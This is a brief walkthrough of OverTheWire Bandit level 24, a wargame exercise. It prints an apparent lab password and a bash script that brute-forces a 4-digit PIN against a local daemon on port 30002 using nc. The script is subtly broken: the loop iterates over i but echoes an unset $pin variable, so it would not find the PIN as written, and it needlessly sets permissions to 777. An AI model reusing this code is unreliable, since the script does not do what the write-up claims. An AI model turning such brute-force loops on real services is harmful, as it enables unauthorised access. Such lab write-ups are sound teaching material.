### Level 24

Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.


Making it straight to point, we need to brute force and find the right combination to retrieve the passcode.

We make an directory in the tmp folder and make a shell script to automate the process and make it display the passcode for level 25


```
$ mkdir /tmp/hsip

$ cd /tmp/hsip

$ vim brute.sh

bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for i in {0000..9999}; do
    echo "$bandit24 $pin"
done | nc localhost 30002

$ chmod 777 brute.sh

$ ./brute.sh

```